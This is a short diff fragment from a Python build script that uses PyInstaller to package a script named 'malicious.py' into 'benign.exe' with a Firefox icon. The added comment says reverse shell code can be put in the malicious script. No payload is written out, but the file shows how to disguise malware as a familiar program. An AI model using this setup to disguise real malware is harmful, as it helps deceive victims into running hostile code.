@@ -2,7 +2,7 @@ import PyInstaller.__main__
 import shutil
 import os
 
-filename = "malicious.py"
+filename = "malicious.py"                       # this is malicious script, we can add reverse shell code in this script
 exename = "benign.exe"
 icon = "Firefox.ico"
 pwd = os.getcwd()                               # gets working directory path
